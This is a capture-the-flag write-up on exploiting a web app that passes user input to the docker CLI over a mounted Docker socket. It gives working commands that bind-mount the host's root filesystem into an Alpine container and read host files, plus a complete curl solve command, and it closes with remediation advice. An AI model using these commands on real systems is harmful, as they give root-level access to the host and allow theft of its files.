# The Open Door

## Overview

A Flask web app titled **"TAPROBANE CONTAINER MANAGER"** presented itself as a
"Docker Container Administration Portal". The challenge description hinted that
the app "talks to something it really shouldn't have access to" and that the
flag "lives one layer down, on the machine hosting the party".

Given to us: an HTTP target at `192.168.45.128:8089` and the hint that the flag
resides on the **host** machine, not inside the web application itself.

---

## Recon

`GET /` immediately returned a form and — far more usefully — three HTML comments
that spelled out the entire bug:

```html
<!-- SYSTEM: docker socket mounted at /var/run/docker.sock -->
<!-- INTEL: container manager has unrestricted access to docker daemon -->
<!-- DeBUG: flag store path: /tmp/ -->
```

The page has a single form that `POST`s a `cmd` parameter to `/docker`.
Testing it:

- `cmd=ps` → returns live `docker ps` output (empty table)
- `cmd=images` → returns `docker images`, listing `alpine:latest`,
  `rb11-factory`, `rb12-sandbox`, `ubuntu:22.04`, `w10-container`

So the app pipes user input straight into the `docker` CLI and echoes the output
back. No allowlist is actually enforced.

---

## Analysis

The vulnerability is **arbitrary Docker command execution through an exposed
Docker socket**. The app runs the user's `cmd` via `subprocess` directly against
a Docker daemon whose socket (`/var/run/docker.sock`) is mounted into the web
container. An exposed Docker socket is functionally equivalent to **root on the
host**, because it lets you:

1. spawn containers with arbitrary volume mounts,
2. bind-mount the host filesystem into a container,
3. read/write any host file.

A key behavioural detail discovered during exploitation: the app **splits `cmd`
on whitespace** before exec, so shell metacharacters (`>`, `|`, `;`, quotes) are
*not* interpreted. This matters because naive shell-injection payloads fail; the
correct approach is to pass plain, space-separated arguments directly to the
container's entrypoint command.

---

## Exploitation

Step-by-step:

**1. Mount the host root filesystem into a throwaway container:**

```
POST /docker  cmd=run --rm -v /:/host alpine:latest ls -la /host
```

This bind-mounts the host's `/` to `/host` inside an Alpine container and lists
it, confirming the host is a full Ubuntu VM (`swap.img`, `lost+found`, `boot`,
`etc`, …).

**2. Find the flag on the host:**

```
cmd=run --rm -v /:/host alpine:latest ls -la /host/tmp
```

Reveals `w09_flag.txt` (plus other challenge artifacts like `w15_knockd.log`).

**3. Read it:**

```
cmd=run --rm -v /:/host alpine:latest cat /host/tmp/w09_flag.txt
```

The app responded with a styled **"FILE W-09 RECOVERED"** page containing the
flag.

Complete solve command:

```bash
curl -s -X POST http://192.168.45.128:8089/docker \
  --data-urlencode "cmd=run --rm -v /:/host alpine:latest cat /host/tmp/w09_flag.txt"
```

---

## The Flag

```
MAHASONA{docker_socket_exposed_host_compromised}
```

Found in the host filesystem at `/tmp/w09_flag.txt`, read by mounting the host
root into an Alpine container via the exposed Docker socket.

---

## Remediation

As a developer, this is how I would fix it:

1. **Never mount `/var/run/docker.sock` into a container that serves web traffic** —
   and never expose it to the public internet.
2. **Enforce the allowlist that already exists.** The code reportedly *defines*
   a command allowlist but never checks it. Applying `if cmd not in allowlist:
   reject` closes the hole. Better: accept only structured, parameterised
   actions (e.g. `action=ps`) and map them to a fixed whitelist of safe calls,
   never a raw string.
3. **Use a Docker socket proxy** (e.g. `docker-socket-proxy`) that only forwards
   GET-style, read-only endpoints if remote management is genuinely required.
4. **Prefer the Docker REST API over the CLI**, gated behind **TLS client
   certificate authentication**, so even an exposed endpoint can't be abused
   without a valid client cert.
5. **Run containers with least privilege**: no root, read-only filesystems, and
   seccomp/AppArmor profiles so that even a compromised container cannot reach
   the daemon or mount host paths.
6. **Defence in depth for the flag**: don't leave secrets in world-readable host
   paths like `/tmp`; use a secret store or environment-scoped mounts.
